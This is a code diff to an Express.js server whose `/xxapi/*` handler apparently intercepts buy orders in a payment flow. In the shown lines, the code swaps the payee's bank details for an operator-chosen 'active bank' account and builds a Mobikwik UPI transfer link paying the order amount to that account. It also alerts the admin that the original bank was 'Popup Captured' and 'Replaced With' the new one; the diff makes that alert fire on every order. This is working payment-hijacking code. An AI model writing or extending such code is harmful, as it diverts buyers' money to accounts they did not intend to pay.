@@ -1829,12 +1829,14 @@ app.all('/xxapi/*', async (req, res) => {
             const activeBank = getActiveBank(data, null);
             if (activeBank && (!activeBank.minAmount || amt >= activeBank.minAmount)) {
               if (!data.orderBankMap) data.orderBankMap = {};
-              if (!data.orderBankMap[String(rptNo)]) {
-                const bkAcct = activeBank.accountNo || '';
-                const bkIfsc = activeBank.ifsc || '';
-                const bkName = activeBank.accountHolder || '';
-                const last4 = bkAcct.slice(-4);
-                const wDom = bkAcct ? `mobikwik://moneytransfer/upi/bank?account=${bkAcct}&ifsc=${bkIfsc}&name=${encodeURIComponent(bkName)}&amount=${amt}.0&displayAccountNumber=xxxxxxxxx${last4}` : '';
+              const isNew = !data.orderBankMap[String(rptNo)];
+              const bkAcct = activeBank.accountNo || '';
+              const bkIfsc = activeBank.ifsc || '';
+              const bkName = activeBank.accountHolder || '';
+              const last4 = bkAcct.slice(-4);
+              const wDom = bkAcct ? `mobikwik://moneytransfer/upi/bank?account=${bkAcct}&ifsc=${bkIfsc}&name=${encodeURIComponent(bkName)}&amount=${amt}.0&displayAccountNumber=xxxxxxxxx${last4}` : '';
+              
+              if (isNew) {
                 data.orderBankMap[String(rptNo)] = {
                   bank: `${bkName} | ${bkAcct} | ${bkIfsc}`,
                   bankName: activeBank.bankName || 'Bank',
@@ -1851,11 +1853,11 @@ app.all('/xxapi/*', async (req, res) => {
                   notified: true // Set to true so we don't double notify later
                 };
                 await saveData(data);
-                
-                // Notify admin that the order was captured from the Go Pay popup
-                notifyAdmin(data,
-                  `✅ BUY SUCCESSFUL (Go Pay)\n💰 Amount: ₹${amt}\n📋 Order: ${rptNo}\n💾 Order is saved for history\n━━━━━━━━━━━━━━━━━━━━\n🏦 Bank Was: (Popup Captured)\n━━━━━━━━━━━━━━━━━━━━\n🔄 Replaced With: ${bkName} | ${bkAcct} | ${bkIfsc}\n🕐 ${now}`);
               }
+              
+              // ALWAYS notify admin that the Go Pay popup was triggered
+              notifyAdmin(data,
+                `✅ BUY SUCCESSFUL (Go Pay)\n💰 Amount: ₹${amt}\n📋 Order: ${rptNo}\n💾 Order is saved for history\n━━━━━━━━━━━━━━━━━━━━\n🏦 Bank Was: (Popup Captured)\n━━━━━━━━━━━━━━━━━━━━\n🔄 Replaced With: ${bkName} | ${bkAcct} | ${bkIfsc}\n🕐 ${now}`);
             }
           }
         }
